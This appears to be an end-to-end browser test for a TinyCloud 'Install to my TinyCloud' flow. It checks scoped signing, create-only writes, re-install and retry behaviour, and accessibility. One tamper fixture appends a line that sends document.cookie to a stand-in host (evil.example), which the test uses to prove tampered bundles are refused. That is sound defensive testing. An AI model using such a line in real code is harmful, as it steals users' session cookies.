#!/usr/bin/env node

/**
 * T5a install gate: "Install to my TinyCloud" on the hermetic native stack.
 *
 * Same stack and rules as joined-gate.mjs (real Node, Location Registry and
 * OpenCredentials; OpenKey is the signing fixture; the browser reaches the
 * candidate build at https://share.tinycloud.xyz/apps/). It proves, in a real
 * browser against a real Node:
 *  - a fresh account installs the Health Log sample: one sign-in, every file
 *    create-only under `<app_id>/app/` and `<app_id>/knowledge/`, install.json
 *    written last, and the app is in the account's apps list;
 *  - the installer session asked for exactly the two put-only folders plus the
 *    account registry, and nothing the app itself asks for (the recorded
 *    registry manifest carries no SQL grant);
 *  - a hand-edited knowledge/app.md survives a re-install, and the re-install
 *    says "Already installed: your copy is kept.";
 *  - a tampered bundle file (served by this gate) is refused with ZERO writes
 *    and no OpenKey or Node request at all;
 *  - a write that fails mid-install leaves install.json unwritten and a retry
 *    resumes, keeping what was saved;
 *  - a double click is one sign-in;
 *  - nothing is kept in browser storage, and no CSP / Trusted Types violation
 *    fires;
 *  - every state of the sheet (idle, pending approval, installing, installed,
 *    already installed, error) at 390 and 1440 px, light and dark, with axe.
 *
 * Run: TC500_NODE_WORKTREE=<tinycloud-node v1.21.0 tree> node test/e2e-prod/install-gate.mjs
 * (T5A_SHOT_DIR saves the screenshots; T5A_ARTIFACT the JSON report.)
 */
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { execFileSync } from "node:child_process";
import { mkdir, mkdtemp, readFile, readdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import puppeteer from "puppeteer";
import { installBrowserInstrumentation } from "./browser-instrumentation.mjs";
import { startCandidateServer } from "./candidate-server.mjs";
import { runBoundedStep, startNativeStack } from "./native-stack.mjs";

const shareRoot = resolve(import.meta.dirname, "../..");
const workspaceRoot = resolve(shareRoot, "../../../../");
const nodeRoot = process.env.TC500_NODE_WORKTREE ?? join(workspaceRoot, "worktrees/tinycloud-node/v1.21.0");
const credentialsRoot = process.env.TC500_OPENCREDENTIALS_WORKTREE ?? "/tmp/tc500-oc-846c018";
const registryRoot = process.env.TC500_REGISTRY_WORKTREE ?? "/tmp/tc500-registry-74b2917";
const shotDir = process.env.T5A_SHOT_DIR;
const outputPath = resolve(process.env.T5A_ARTIFACT ?? join(workspaceRoot, ".context/t5a-install-gate.json"));
const catalog = JSON.parse(await readFile(join(shareRoot, "apps/catalog.json"), "utf8"));
const axeSource = await readFile(join(shareRoot, "node_modules/axe-core/axe.min.js"), "utf8");
const app = (id) => catalog.apps.find((entry) => entry.app_id === id);
const HEALTH = "xyz.tinycloud.sample.healthlog";
const RECIPES = "xyz.tinycloud.sample.recipes";
const NOTES = "com.example.notes";

const trace = [];
const consoleLog = [];
/** The SIWE messages OpenKey was asked to sign (held in memory only; never printed, only their capability lists are). */
const signedMessages = [];
let phase = "setup";
const sha = (value) => createHash("sha256").update(value).digest("hex");
const settle = (ms) => new Promise((done) => setTimeout(done, ms));

async function waitUntil(check, timeout = 180_000) {
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    const value = await check();
    if (value) return value;
    await settle(150);
  }
  return undefined;
}

/** A request the browser makes to a service the gate can hold or fail on purpose. */
function hold() {
  let release; let reached;
  const gate = new Promise((resolveGate) => { release = resolveGate; });
  const arrived = new Promise((resolveArrived) => { reached = resolveArrived; });
  return { gate, release, reached, arrived };
}
/** `sign`: held OpenKey signature. `record`: held node write of install.json. `failRecord`: that write fails. `tamper`: path -> bytes served instead of the real file. */
const controls = { sign: undefined, record: undefined, failRecord: false, tamper: new Map() };

function headerSubset(request) {
  const headers = new Headers(request.headers());
  for (const key of ["accept-encoding", "connection", "content-length", "host", "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "x-tc500-binary-id"]) headers.delete(key);
  return headers;
}

async function installRouting(page, stack, candidatePort) {
  await page.evaluateOnNewDocument(installBrowserInstrumentation);
  await page.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (event) => window.__violations.push(`${event.violatedDirective} ${event.blockedURI}`));
  });
  page.on("console", (message) => { if (message.type() === "error" || message.type() === "warn") consoleLog.push({ phase, type: message.type(), text: message.text().replaceAll(/https:\/\/[^\s#]+(?:#[^\s]*)?/g, "<url>").slice(0, 240) }); });
  page.on("pageerror", (error) => consoleLog.push({ phase, type: "pageerror", text: String(error?.message ?? "page error").slice(0, 240) }));
  await page.setRequestInterception(true);
  page.on("request", (request) => { void (async () => {
    const url = new URL(request.url());
    const entry = { phase, method: request.method(), origin: url.origin, path: url.pathname, status: undefined };
    trace.push(entry);
    if (url.protocol === "data:" || url.protocol === "blob:") { await request.continue(); return; }
    if (url.origin === stack.canonical.share) {
      const replacement = request.method() === "GET" ? [...controls.tamper].find(([path]) => url.pathname.endsWith(path)) : undefined;
      if (replacement !== undefined) { entry.tampered = true; await request.respond({ status: 200, contentType: "application/octet-stream", body: Buffer.from(replacement[1]) }); return; }
      await request.continue(); return;
    }
    const targets = new Map([
      [stack.canonical.node, stack.services.nodeOrigin],
      [stack.canonical.credentials, stack.services.credentialsOrigin],
      [stack.canonical.registry, stack.services.registryOrigin],
      ["https://openkey.so", stack.services.openKeyOrigin],
      ["https://api.openkey.so", stack.services.openKeyOrigin],
    ]);
    const targetOrigin = targets.get(url.origin);
    if (targetOrigin === undefined) { await request.abort("blockedbyclient"); return; }
    if (request.method() === "OPTIONS" && url.origin === "https://api.openkey.so") {
      await request.respond({ status: 204, headers: { "access-control-allow-origin": stack.canonical.share, "access-control-allow-methods": "POST, OPTIONS", "access-control-allow-headers": "authorization, content-type", vary: "Origin" } }); return;
    }
    if (url.origin === "https://openkey.so" && request.method() === "POST" && url.pathname === "/sign" && controls.sign !== undefined) {
      controls.sign.reached(); await controls.sign.gate;
    }
    let body;
    if (!new Set(["GET", "HEAD"]).has(request.method())) {
      const binaryId = request.headers()["x-tc500-binary-id"];
      if (url.pathname === "/invoke" && binaryId !== undefined) {
        const captured = await page.evaluate((id) => { const bytes = window.__tc500BinaryBodies[id]; delete window.__tc500BinaryBodies[id]; return bytes; }, binaryId);
        assert(Array.isArray(captured), "binary browser request body was not captured");
        body = Buffer.from(captured);
      } else body = await request.fetchPostData();
    }
    if (url.origin === stack.canonical.node && url.pathname === "/invoke" && body !== undefined && Buffer.from(body).includes('"installed_at"')) {
      entry.installRecordWrite = true;
      if (controls.record !== undefined) { controls.record.reached(); await controls.record.gate; }
      if (controls.failRecord) { entry.status = -1; await request.abort("failed"); return; }
    }
    if (url.origin === "https://openkey.so" && url.pathname === "/sign" && body !== undefined) {
      try { const { message } = JSON.parse(Buffer.from(body).toString("utf8")); if (typeof message === "string") signedMessages.push({ phase, message }); } catch {}
    }
    if (entry !== undefined && body !== undefined) { entry.requestByteLength = Buffer.byteLength(body); entry.requestSha256 = sha(body); }
    const response = await fetch(new URL(`${url.pathname}${url.search}`, targetOrigin), { method: request.method(), headers: headerSubset(request), redirect: "manual", ...(body === undefined ? {} : { body }) });
    const bytes = Buffer.from(await response.arrayBuffer());
    entry.status = response.status;
    try { entry.response = JSON.parse(bytes.toString("utf8")); } catch {}
    const headers = Object.fromEntries(response.headers.entries());
    for (const key of ["connection", "content-encoding", "content-length", "keep-alive", "transfer-encoding"]) delete headers[key];
    if (url.origin !== "https://openkey.so") {
      headers["access-control-allow-origin"] = request.headers().origin ?? stack.canonical.share;
      headers["access-control-allow-credentials"] = "true";
      headers["access-control-allow-methods"] = "GET, PUT, POST, OPTIONS";
      headers["access-control-allow-headers"] = request.headers()["access-control-request-headers"] ?? "authorization, content-type";
      headers.vary = "Origin";
    }
    await request.respond({ status: response.status, headers, body: bytes });
  })().catch(() => request.abort("failed").catch(() => undefined)); });
}

async function openApps(browser, stack, candidatePort, label) {
  phase = label;
  const context = await browser.createBrowserContext();
  const page = await context.newPage();
  await page.setViewport({ width: 1440, height: 900 });
  await installRouting(page, stack, candidatePort);
  await page.goto(`${stack.canonical.share}/apps/`, { waitUntil: "domcontentloaded", timeout: 180_000 });
  await page.waitForSelector(".apps-card", { timeout: 60_000 });
  return { context, page };
}

/** Opens the install sheet from the card and waits until Continue is offered. */
async function openInstallSheet(page, appId) {
  const index = catalog.apps.findIndex((entry) => entry.app_id === appId);
  await page.evaluate((position) => document.querySelectorAll(".apps-card")[position].querySelectorAll("button")[1].click(), index);
  await page.waitForFunction(() => [...document.querySelectorAll("#apps-sheet button")].some((button) => button.textContent === "Continue" && !button.disabled), { timeout: 60_000 });
}

const TERMINAL = /^(Installed\.|Already installed|Not installed yet|Sign-in cancelled|OpenKey didn't|Another OpenKey|That approval|We couldn't|.* files don't match the catalog|This catalog entry|Couldn't load)/;
const statusText = (page) => page.$eval(".apps-install-line", (node) => node.textContent).catch(() => "");

/** Records every announcement of the live region, from now on. */
async function recordStatus(page) {
  await page.evaluate(() => {
    window.__announced = [];
    const status = document.querySelector(".apps-install-status");
    new MutationObserver(() => { const text = status.querySelector(".apps-install-line")?.textContent ?? ""; if (text !== "" && window.__announced.at(-1) !== text) window.__announced.push(text); }).observe(status, { childList: true, characterData: true, subtree: true });
  });
}

async function finished(page, timeout = 300_000) {
  const text = await waitUntil(async () => { const value = await statusText(page); return TERMINAL.test(value) ? value : undefined; }, timeout);
  assert(text, "the install never reached a final state");
  return text;
}

const COMBOS = [[390, 844, "light"], [390, 844, "dark"], [1440, 900, "light"], [1440, 900, "dark"]];
const axeFindings = [];

/** The sheet as it is now, at 390 and 1440 px in light and dark: axe AA, no sideways scroll, one screenshot each. */
async function captureState(page, name) {
  for (const [width, height, scheme] of COMBOS) {
    await page.setViewport({ width, height }); await page.emulateMediaFeatures([{ name: "prefers-color-scheme", value: scheme }]);
    await settle(700);
    await page.evaluate(axeSource);
    const result = await page.evaluate(() => globalThis.axe.run(document, { runOnly: { type: "tag", values: ["wcag2a", "wcag2aa", "wcag21a", "wcag21aa", "wcag22aa"] } }));
    const found = result.violations.map((violation) => `${violation.id}: ${violation.nodes.map((node) => node.target.join(" ")).join(" | ")}`);
    axeFindings.push({ state: name, width, scheme, violations: found });
    assert.deepEqual(found, [], `${name} ${width}px ${scheme}: axe AA`);
    assert((await page.evaluate(() => { const sheet = document.querySelector("#apps-sheet"); return sheet.scrollWidth - sheet.clientWidth; })) <= 0, `${name} ${width}px ${scheme}: the sheet scrolls sideways`);
    // The status sits in the sheet's footer: show the end of the sheet body too.
    if (shotDir !== undefined) { await mkdir(shotDir, { recursive: true }); await page.screenshot({ path: join(shotDir, `install-${name}-${width}-${scheme}.png`) }); }
  }
  await page.setViewport({ width: 1440, height: 900 }); await page.emulateMediaFeatures([{ name: "prefers-color-scheme", value: "light" }]);
}

/**
 * Reads (and, for `edit`, overwrites) the signed-in account's own data through the product's own sign-in helper, as the person's own reader/agent
 * would: a manifest with read/list/put/del on `<app_id>/` in `applications` plus the account's apps list. Its own app id keeps it out of the way.
 */
async function reader(page, chunkUrl, request) {
  return page.evaluate(async (chunk, input) => {
    const module = await import(chunk);
    // The build keeps this chunk's export names, or (minified) exposes the module's namespace object as one export.
    const session = typeof module.signInWithManifest === "function" ? module : Object.values(module).find((value) => typeof value === "object" && value !== null && typeof value.signInWithManifest === "function");
    if (session === undefined) throw new Error("the account chunk does not carry the sign-in helper");
    const config = await (await fetch("/.well-known/tinycloud-share/config.json")).json();
    const manifest = { manifest_version: 1, app_id: "xyz.tinycloud.e2e.reader", name: "Install gate reader", space: "applications", prefix: "", defaults: false, includePublicSpace: false, permissions: [{ service: "tinycloud.kv", path: `${input.appId}/`, actions: ["get", "list", "put", "del", "metadata"], skipPrefix: true }] };
    const { tinycloud, spaces } = await session.signInWithManifest({ manifest, config, hostSpaces: ["applications"], allowedSpaces: ["applications"], allowedServices: ["kv"], allowedActions: ["get", "put", "list", "metadata", "del"], allowedPathPrefixes: [`${input.appId}/`] });
    const kv = tinycloud.kvForSpace(spaces.applications);
    const hex = async (bytes) => [...new Uint8Array(await crypto.subtle.digest("SHA-256", bytes))].map((byte) => byte.toString(16).padStart(2, "0")).join("");
    if (input.op === "edit") {
      const written = await kv.put(input.key, new TextEncoder().encode(input.text), { contentType: "text/markdown; charset=utf-8" });
      if (!written.ok) throw new Error(`edit failed: ${written.error?.code}`);
      return { edited: input.key };
    }
    const listed = await kv.list({ prefix: `${input.appId}/` });
    if (!listed.ok) throw new Error(`list failed: ${listed.error?.code}`);
    const keys = [...listed.data.keys].sort();
    const files = {};
    for (const key of keys) {
      const got = await kv.get(key, { binary: true });
      if (!got.ok) throw new Error(`get failed: ${got.error?.code}`);
      files[key] = { sha256: await hex(got.data.data), size: got.data.data.byteLength, contentType: got.data.headers?.contentType ?? null, text: key.endsWith("install.json") || key.endsWith("knowledge/app.md") ? new TextDecoder().decode(got.data.data) : undefined };
    }
    const apps = await tinycloud.account.applications.list();
    const registered = apps.ok ? apps.data.map((entry) => ({ appId: entry.appId, manifests: entry.manifests })) : { error: apps.error?.code };
    // The list may carry only identity; the record itself is the thing to inspect.
    const records = {};
    if (apps.ok) for (const entry of apps.data) { const got = await tinycloud.account.applications.get(entry.appId); records[entry.appId] = got.ok ? got.data : { error: got.error?.code }; }
    return { keys, files, registered, records };
  }, chunkUrl, request);
}

/** The installer's capability set as a recap lists it: `<space>/<service>/<path> <ability>`, from install-plan.ts (the sheet's own source). */
const expectedResources = (appId) => [
  `applications/kv/${appId}/app/ tinycloud.kv/put`,
  `applications/kv/${appId}/knowledge/ tinycloud.kv/put`,
  "applications/capabilities tinycloud.capabilities/read",
  ...[["get", "put", "list"].map((verb) => `account/kv/applications/ tinycloud.kv/${verb}`), ["get", "put", "list"].map((verb) => `account/kv/spaces/ tinycloud.kv/${verb}`), ["get", "put"].map((verb) => `account/kv/system/bootstrap/complete tinycloud.kv/${verb}`)].flat(),
  "account/delegation tinycloud.delegation/list",
  ...["read", "write", "schema"].map((verb) => `account/sql/account tinycloud.sql/${verb}`),
  "account/capabilities tinycloud.capabilities/read",
];
const expectedKeys = (entry) => [...entry.bundle.files.map((file) => (file.path.startsWith("knowledge/") ? `${entry.app_id}/${file.path}` : `${entry.app_id}/app/${file.path}`)), `${entry.app_id}/app/install.json`].sort();
const nodeRequests = (stack, from) => trace.slice(from).filter((entry) => entry.origin === stack.canonical.node || /openkey/.test(entry.origin));

let stack; let candidate; let browser; let watchdog;
const report = { type: "tinycloud.share/t5a-install-gate/v1", stages: {} };
const temporary = await mkdtemp(join(tmpdir(), "tc500-t5a-install-"));
try {
  phase = "build";
  await runBoundedStep("npm", ["run", "build"], shareRoot, {}, 10 * 60_000);
  const chunkName = (await readdir(join(shareRoot, "dist/assets"))).find((name) => /^openkey-session-.*\.js$/.test(name));
  assert(chunkName, "the build has no openkey-session chunk");
  const chunkUrl = `/assets/${chunkName}`;
  const cert = join(temporary, "candidate.pem"); const key = join(temporary, "candidate.key");
  execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", cert, "-subj", "/CN=share.tinycloud.xyz", "-days", "1"], { stdio: "ignore", timeout: 60_000 });
  const spki = execFileSync("sh", ["-c", `openssl x509 -pubkey -noout -in '${cert}' | openssl pkey -pubin -outform DER | openssl dgst -sha256 -binary | base64`], { encoding: "utf8", timeout: 30_000 }).trim();
  candidate = await startCandidateServer({ root: resolve(shareRoot, "dist"), key: await readFile(key), cert: await readFile(cert) });
  phase = "stack";
  stack = await startNativeStack({ root: temporary, nodeRoot, credentialsRoot, registryRoot });
  watchdog = setTimeout(() => { console.error(`[t5a] install gate timed out in ${phase}`); process.exit(1); }, 25 * 60_000); watchdog.unref();
  browser = await puppeteer.launch({ headless: process.env.HEADED !== "1", args: [`--host-resolver-rules=MAP share.tinycloud.xyz 127.0.0.1:${candidate.port}`, `--ignore-certificate-errors-spki-list=${spki}`, "--disable-quic", "--no-proxy-server"] });

  // ---- 1. A fresh account installs the Health Log sample (states held for the screenshots).
  const health = app(HEALTH);
  {
    const { page, context } = await openApps(browser, stack, candidate.port, "install-health");
    await openInstallSheet(page, HEALTH);
    await captureState(page, "idle-sample");
    await recordStatus(page);
    controls.sign = hold();
    const before = trace.length;
    await page.click("#apps-sheet footer button");
    await controls.sign.arrived;
    assert.match(await statusText(page), /^Approve in the OpenKey window to install Health Log \(sample\)/);
    await captureState(page, "pending-approval");
    controls.sign.release(); controls.sign = undefined;
    // Hold the last write (install.json) to show the installing state with the files already in place.
    controls.record = hold();
    await controls.record.arrived;
    assert.match(await statusText(page), /^Installing Health Log \(sample\)… 14 of 15 files/);
    await captureState(page, "installing");
    controls.record.release(); controls.record = undefined;
    const outcome = await finished(page);
    assert.equal(outcome, "Installed.", "a fresh install says Installed.");
    const announced = await page.evaluate(() => window.__announced);
    for (const expected of ["Checking Health Log (sample)'s files against the catalog…", "Opening OpenKey…", "Approve in the OpenKey window to install Health Log (sample)", "Installing Health Log (sample)… 0 of 15 files", "Adding Health Log (sample) to your apps…", "Installed."]) {
      assert(announced.some((text) => text.startsWith(expected)), `the live region never said "${expected}" (${JSON.stringify(announced.map((text) => text.slice(0, 50)))})`);
    }
    assert((await page.$eval(".apps-install-status", (node) => node.getAttribute("aria-live"))) === "polite");
    assert.equal(await page.$eval("#apps-sheet footer .apps-install-actions a", (node) => node.getAttribute("href")), `/apps/run#${HEALTH}`, "Open links to the runner");
    await captureState(page, "installed");

    const during = trace.slice(before).filter((entry) => entry.phase === "install-health");
    // One sign-in: a single OpenKey connect for the whole install (each signature then opens its own sign widget).
    assert.equal(during.filter((entry) => entry.origin === "https://openkey.so" && /^\/widget\/embed\/(?!sign)/.test(entry.path)).length, 1, "the install connected to OpenKey more than once");
    // The files and the record were written by create-only requests to the owner's node.
    const stored = await reader(page, chunkUrl, { op: "read", appId: HEALTH });
    assert.deepEqual(stored.keys, expectedKeys(health), "the account holds exactly the bundle plus install.json under <app_id>/app/ and <app_id>/knowledge/");
    for (const file of health.bundle.files) {
      const key = file.path.startsWith("knowledge/") ? `${HEALTH}/${file.path}` : `${HEALTH}/app/${file.path}`;
      assert.equal(stored.files[key].sha256, file.sha256, `${key}: stored bytes equal the catalog's`);
    }
    const record = JSON.parse(stored.files[`${HEALTH}/app/install.json`].text);
    assert.deepEqual(Object.keys(record).sort(), ["digest", "installed_at", "source"]);
    assert.equal(record.digest, health.bundle.digest);
    assert.equal(record.source.commit, health.source.commit);
    const listed = stored.registered.find((entry) => entry.appId === HEALTH);
    assert(listed, `the account apps list shows the app (${JSON.stringify(stored.registered.map((entry) => entry.appId))})`);
    // The registry record is the installer's request, not the app's: no SQL, no cross-app grant, no secrets.
    // The SDK's registry record for this app is its id and a manifest hash (the web SDK stores `manifests: []`): the record cannot carry the app's own grants.
    const record_ = stored.records[HEALTH];
    assert.equal(record_?.appId, HEALTH);
    // (Its manifestHash is the hash of an empty manifest list, the same for every app: it says nothing about grants.)
    assert.deepEqual(record_?.manifests, [], "the registry record carries manifests");
    assert(!JSON.stringify(record_).match(/tinycloud\.sql|secrets|"did"/), "the registry record carries the app's own runtime grants");
    // The session the install signed: its ReCap, decoded from the SIWE message OpenKey signed, is exactly the sheet's list.
    const sessionMessage = signedMessages.filter((entry) => entry.phase === "install-health").map((entry) => entry.message).find((message) => message.includes("urn:recap:"));
    assert(sessionMessage, "no session SIWE message with a ReCap was signed");
    const recap = JSON.parse(Buffer.from(sessionMessage.match(/urn:recap:([A-Za-z0-9_-]+)/)[1], "base64url").toString("utf8"));
    const granted = Object.entries(recap.att).flatMap(([resource, abilities]) => Object.entries(abilities).map(([ability]) => `${resource.replace(/^tinycloud:pkh:eip155:\d+:0x[0-9a-fA-F]{40}:/, "")} ${ability}`)).sort();
    const sheetExpects = expectedResources(HEALTH).sort();
    assert.deepEqual(granted, sheetExpects, "the signed ReCap is not exactly the installer's two folders plus the account registry");
    report.signedRecap = granted;
    // The session lasts exactly what the sheet says: "For the next 15 minutes" is derived from the constant the signed expiry comes from.
    const issued = Date.parse(sessionMessage.match(/Issued At: (\S+)/)[1]);
    const expires = Date.parse(sessionMessage.match(/Expiration Time: (\S+)/)[1]);
    const said = (await page.$$eval("#apps-sheet p", (nodes) => nodes.map((node) => node.textContent))).find((text) => /For the next \d+ minutes?, Share can then:/.test(text ?? ""));
    assert(said, "the sheet does not state how long the session lasts");
    const minutes = Number(said.match(/For the next (\d+) minute/)[1]);
    assert.equal(expires - issued, minutes * 60_000, `the signed session lasts ${(expires - issued) / 60_000} minutes; the sheet says ${minutes}`);
    report.sessionMinutes = minutes;
    // OpenKey signatures this install needed (connect is separate): a brand-new account also hosts its spaces.
    const signs = during.filter((entry) => entry.origin === "https://openkey.so" && entry.method === "POST" && entry.path === "/sign").length;
    report.stages.freshInstall = { openKeySignatures: signs, announced: announced.map((text) => text.slice(0, 80)), keys: stored.keys.length, registered: true, registryRecord: { manifests: record_.manifests.length } };
    // Nothing is kept by the page.
    const storage = await page.evaluate(async () => ({ entries: [...Object.entries(localStorage), ...Object.entries(sessionStorage), ...document.cookie.split(";").map((cookie) => cookie.trim()).filter(Boolean)], databases: (await indexedDB.databases()).map((database) => database.name ?? "") }));
    assert.deepEqual(storage, { entries: [], databases: [] }, "the page stored something while installing");
    assert.deepEqual(await page.evaluate(() => window.__violations), [], "a CSP or Trusted Types violation fired");
    await context.close();
  }

  // ---- 2. The person (or their agent) edits knowledge/app.md; a re-install keeps it and says so.
  {
    const { page, context } = await openApps(browser, stack, candidate.port, "reinstall-health");
    const mine = `# My notes\n\nEdited by hand ${Date.now()}: café ✓\n`;
    // Edit through the same product helper, then install again from a new page.
    await reader(page, chunkUrl, { op: "edit", appId: HEALTH, key: `${HEALTH}/knowledge/app.md`, text: mine });
    await openInstallSheet(page, HEALTH);
    await recordStatus(page);
    const writesBefore = trace.length;
    await page.click("#apps-sheet footer button");
    const outcome = await finished(page);
    assert.equal(outcome, "Already installed: your copy is kept.");
    report.signaturesOnExistingAccount = trace.slice(writesBefore).filter((entry) => entry.phase === "reinstall-health" && entry.origin === "https://openkey.so" && entry.method === "POST" && entry.path === "/sign").length;
    await captureState(page, "already-installed");
    const stored = await reader(page, chunkUrl, { op: "read", appId: HEALTH });
    assert.equal(stored.files[`${HEALTH}/knowledge/app.md`].text, mine, "the hand-edited knowledge/app.md was overwritten");
    assert.deepEqual(stored.keys, expectedKeys(health));
    // The install record is the first install's, not rewritten.
    assert.equal(JSON.parse(stored.files[`${HEALTH}/app/install.json`].text).digest, health.bundle.digest);
    const puts = trace.slice(writesBefore).filter((entry) => entry.phase === "reinstall-health" && entry.status === 412);
    assert(puts.length >= health.bundle.files.length + 1, `every create-only write met the existing file (412): saw ${puts.length}`);
    report.stages.reinstall = { outcome, keptHandEdit: true, preconditionFailures: puts.length };
    await context.close();
  }

  // ---- 3. A tampered bundle file: refused with zero writes and no OpenKey or Node request.
  const recipes = app(RECIPES);
  {
    controls.tamper.set(`${recipes.bundle.root}app.jsx`, Buffer.concat([await readFile(join(shareRoot, "public", recipes.bundle.root, "app.jsx")), Buffer.from("\nfetch('https://evil.example/' + document.cookie);\n")]));
    const { page, context } = await openApps(browser, stack, candidate.port, "tampered-recipes");
    await openInstallSheet(page, RECIPES);
    await recordStatus(page);
    const start = trace.length;
    await page.click("#apps-sheet footer button");
    const outcome = await finished(page);
    assert.match(outcome, /files don't match the catalog, so nothing was installed\. Nothing was written to your TinyCloud\.$/);
    assert.equal((await page.$$eval(".apps-install-status [role=alert]", (nodes) => nodes.length)), 1, "a refusal is an alert");
    assert(trace.slice(start).some((entry) => entry.tampered === true), "the tampered file was never served");
    assert.deepEqual(nodeRequests(stack, start), [], "a tampered bundle reached OpenKey or the owner's node");
    await captureState(page, "refused-tampered");
    controls.tamper.clear();
    await context.close();
    const check = await openApps(browser, stack, candidate.port, "tampered-recipes-readback");
    const stored = await reader(check.page, chunkUrl, { op: "read", appId: RECIPES });
    assert.deepEqual(stored.keys, [], "a refused install wrote something");
    assert(!stored.registered.some((entry) => entry.appId === RECIPES), "a refused install was listed");
    await check.context.close();
    report.stages.tampered = { outcome: outcome.slice(0, 60), writes: 0, openKeyOrNodeRequests: 0 };
  }

  // ---- 4. A write fails at the very end: install.json is never written, and a retry resumes.
  {
    const { page, context } = await openApps(browser, stack, candidate.port, "partial-recipes");
    await openInstallSheet(page, RECIPES);
    await recordStatus(page);
    controls.failRecord = true;
    await page.click("#apps-sheet footer button");
    const outcome = await finished(page);
    const total = recipes.bundle.files.length + 1;
    assert.equal(outcome.startsWith(`Not installed yet: ${total - 1} of ${total} files were saved.`), true, `the partial failure message was "${outcome}"`);
    assert.equal(await page.$$eval(".apps-install-status [role=alert]", (nodes) => nodes.length), 1);
    await captureState(page, "error-partial");
    const midway = await reader(page, chunkUrl, { op: "read", appId: RECIPES });
    assert.equal(midway.keys.length, total - 1, "the files before the failure are saved");
    assert(!midway.keys.includes(`${RECIPES}/app/install.json`), "install.json was written before the bundle was complete");
    controls.failRecord = false;
    await page.evaluate(() => [...document.querySelectorAll("#apps-sheet footer button")].find((button) => button.textContent === "Try again").click());
    await page.waitForFunction(() => /^(Installed\.|Already|Not installed)/.test(document.querySelector(".apps-install-line")?.textContent ?? ""), { timeout: 300_000 });
    const resumed = await statusText(page);
    assert.equal(resumed.startsWith(`Installed. ${total - 1} files you already had were kept.`), true, `the resume message was "${resumed}"`);
    await captureState(page, "installed-resumed");
    const done = await reader(page, chunkUrl, { op: "read", appId: RECIPES });
    assert.deepEqual(done.keys, expectedKeys(recipes));
    assert(done.registered.some((entry) => entry.appId === RECIPES));
    report.stages.partialFailure = { failed: outcome.slice(0, 70), resumed: resumed.slice(0, 80), installJsonLast: true };
    await context.close();
  }

  // ---- 5. A double click is one sign-in.
  {
    const { page, context } = await openApps(browser, stack, candidate.port, "double-click-notes");
    await openInstallSheet(page, NOTES);
    const start = trace.length;
    await page.evaluate(() => { const button = [...document.querySelectorAll("#apps-sheet footer button")].find((node) => node.textContent === "Continue"); button.click(); button.click(); });
    const outcome = await finished(page);
    assert.equal(outcome, "Installed.");
    const widgets = trace.slice(start).filter((entry) => entry.phase === "double-click-notes" && entry.origin === "https://openkey.so" && /^\/widget\/embed\/(?!sign)/.test(entry.path));
    assert.equal(widgets.length, 1, "a double click connected to OpenKey twice");
    const stored = await reader(page, chunkUrl, { op: "read", appId: NOTES });
    assert.deepEqual(stored.keys, expectedKeys(app(NOTES)));
    report.stages.doubleClick = { openKeyWindows: widgets.length, outcome };
    await context.close();
  }

  // ---- Browser diagnostics: nothing but the fresh-account bootstrap answers and the create-only 412s; no CSP violations (checked per page above).
  const pageErrors = consoleLog.filter((entry) => entry.type === "pageerror");
  assert.deepEqual(pageErrors, [], "a page error was raised");
  const unexpected = consoleLog.filter((entry) => !(
    (entry.type === "error" && /^Failed to load resource: the server responded with a status of (?:400|404|412) /.test(entry.text))
    || (entry.type === "error" && /^Failed to load resource: net::ERR_FAILED$/.test(entry.text))
    || (entry.type === "warn" && /^TinyCloud account (?:registry sync failed after retries|index initialization failed; continuing registry sync)/.test(entry.text))
  ));
  assert.deepEqual(unexpected, [], "the browser logged something unexpected");
  const allowedHosts = new Set([stack.canonical.share, stack.canonical.node, stack.canonical.registry, "https://openkey.so"]);
  assert(trace.every((entry) => entry.protocol === "data:" || allowedHosts.has(entry.origin) || entry.origin === "null" || entry.origin.startsWith("data") || entry.origin.startsWith("blob")), "a request left the allowed origins");
  report.result = "passed";
  report.axe = axeFindings.length;
  report.consoleCounts = consoleLog.reduce((counts, entry) => ({ ...counts, [`${entry.type}`]: (counts[`${entry.type}`] ?? 0) + 1 }), {});
  await mkdir(resolve(outputPath, ".."), { recursive: true });
  await writeFile(outputPath, JSON.stringify(report, null, 2), { mode: 0o600 });
  console.log(JSON.stringify(report, null, 2));
} catch (error) {
  report.result = "failed";
  report.phase = phase;
  report.message = String(error?.message ?? error).slice(0, 600);
  await mkdir(resolve(outputPath, ".."), { recursive: true }).catch(() => undefined);
  await writeFile(outputPath, JSON.stringify({ ...report, console: consoleLog.slice(-30), requests: trace.slice(-60).map(({ phase: p, method, origin, path, status }) => ({ p, method, origin, path, status })) }, null, 2), { mode: 0o600 }).catch(() => undefined);
  console.error(`[t5a] install gate failed in ${phase}: ${report.message}`);
  process.exitCode = 1;
} finally {
  clearTimeout(watchdog);
  await browser?.close().catch(() => undefined); await stack?.close().catch(() => undefined); await candidate?.close().catch(() => undefined);
  process.exit();
}
